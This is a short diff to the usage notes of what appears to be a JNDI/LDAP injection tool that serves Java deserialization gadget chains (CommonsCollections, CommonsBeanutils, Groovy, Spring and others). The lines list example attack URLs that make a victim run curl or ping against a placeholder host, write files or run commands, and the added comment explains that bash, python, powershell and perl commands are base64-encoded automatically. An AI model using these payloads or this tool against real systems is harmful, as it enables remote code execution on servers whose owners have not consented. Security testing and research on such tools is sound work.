@@ -169,7 +169,7 @@ ldap:
 > java -cp jndi_tool.jar jndi.LDAPRefServer 1099 host="0.0.0.0"
 [-] Payloads: CommonsBeanutils1-2,CommonsCollections1-10,CommonsCollectionsK1-4,Groovy1,Clojure,JSON1,Spring1-2,URLDNS,file,tomcat,groovy
 [-] etc: ldap://0.0.0.0:1099/CommonsBeanutils1/curl x.cn
-[-] etc: ldap://0.0.0.0:1099/CommonsCollections1/bash=ping x.cn
+[-] etc: ldap://0.0.0.0:1099/CommonsCollections1/bash=ping x.cn  # bash=后面的命令会自动进行base64编码，支持base=,python=,powershell=,perl=
 [-] etc: ldap://0.0.0.0:1099/URLDNS/x.cn
 [-] etc: ldap://0.0.0.0:1099/file/base64data_filename
 [-] etc: ldap://0.0.0.0:1099/el/whomai
